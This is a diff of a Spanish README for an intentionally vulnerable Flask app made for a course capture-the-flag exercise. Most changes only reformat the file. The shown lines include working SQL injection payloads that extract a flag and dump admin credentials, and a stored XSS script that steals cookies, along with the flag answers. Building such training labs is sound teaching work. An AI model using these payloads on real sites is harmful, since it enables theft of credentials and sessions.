@@ -7,11 +7,11 @@ educativos para el CTF de la cátedra.
 Contiene **3 vulnerabilidades del OWASP Top 10**, una por vista, sin RCE ni
 ninguna falla que comprometa el servidor de la cátedra.
 
-| Vista       | Vulnerabilidad            | OWASP                         | Flag |
-|-------------|---------------------------|-------------------------------|------|
-| `/buscar`   | SQL Injection (UNION)     | A03:2021 – Injection          | `FLAG_SQLI` |
-| `/reviews`  | Stored XSS                | A03:2021 – Injection (XSS)    | `FLAG_XSS` |
-| `/premium`  | Licencia en base64 (no cifrada) | A02:2021 – Cryptographic Failures | `FLAG_CRYPTO` |
+| Vista      | Vulnerabilidad                  | OWASP                             | Flag          |
+| ---------- | ------------------------------- | --------------------------------- | ------------- |
+| `/buscar`  | SQL Injection (UNION)           | A05:2025 – Injection              | `FLAG_SQLI`   |
+| `/reviews` | Stored XSS                      | A05:2025 – Injection (XSS)        | `FLAG_XSS`    |
+| `/premium` | Licencia en base64 (no cifrada) | A04:2025 – Cryptographic Failures | `FLAG_CRYPTO` |
 
 ---
 
@@ -45,6 +45,7 @@ docker run -p 5000:5000 retroflix
 ```
 
 Archivos relevantes:
+
 - `Dockerfile` — imagen `python:3.12-slim`, instala Flask y ejecuta `app.py`.
 - `docker-compose.yml` — publica el puerto `5000` y define las flags por entorno.
 
@@ -57,8 +58,8 @@ La forma más simple es editar `docker-compose.yml`:
 
 ```yaml
 environment:
-  FLAG_SQLI:   "FLAG{tu_flag_sqli}"
-  FLAG_XSS:    "FLAG{tu_flag_xss}"
+  FLAG_SQLI: "FLAG{tu_flag_sqli}"
+  FLAG_XSS: "FLAG{tu_flag_xss}"
   FLAG_CRYPTO: "FLAG{tu_flag_crypto}"
 ```
 
@@ -107,6 +108,7 @@ http://localhost:5000/buscar?q=' UNION SELECT flag,name,'x' FROM secrets-- -
 ➡️ Aparece `FLAG{sql1_un10n_r3tr0fl1x_l34k}` en la tabla de resultados.
 
 **Bonus:** dumpear las credenciales del admin:
+
 ```
 ' UNION SELECT username, password, 'x' FROM users-- -
 ```
@@ -124,7 +126,9 @@ reseñas y tiene una **cookie sensible accesible por JavaScript** (`httponly=Fal
 1. En `/reviews`, publicar una reseña con este cuerpo:
 
    ```html
-   <script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>
+   <script>
+     fetch("/collect?c=" + encodeURIComponent(document.cookie));
+   </script>
    ```
 
 2. Cuando el **administrador** abre su panel de moderación (`/admin`), el script
@@ -151,7 +155,7 @@ volver a codificarla (OWASP A02: Cryptographic Failures).
 Ejemplo del contenido de un usuario gratuito:
 
 ```json
-{"user": "guest", "premium": false, "role": "user"}
+{ "user": "guest", "premium": false, "role": "user" }
 ```
 
 **Exploit:**
@@ -186,5 +190,5 @@ Ejemplo del contenido de un usuario gratuito:
 ## ⚠️ Aclaración de seguridad
 
 Esta aplicación **no contiene RCE** ni vulnerabilidades que pongan en riesgo el
-servidor. Todas las fallas son de tipo *injection* / *crypto* acotadas a la
+servidor. Todas las fallas son de tipo _injection_ / _crypto_ acotadas a la
 propia aplicación, según lo permitido por la consigna.
